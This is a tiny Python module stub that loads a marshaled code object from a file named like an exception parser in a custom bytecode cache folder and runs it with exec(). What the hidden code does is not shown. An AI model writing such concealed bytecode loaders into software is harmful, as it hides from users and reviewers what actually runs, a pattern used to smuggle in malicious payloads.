
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'exception_parser_d038c0265a634509baef771fc5107644.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
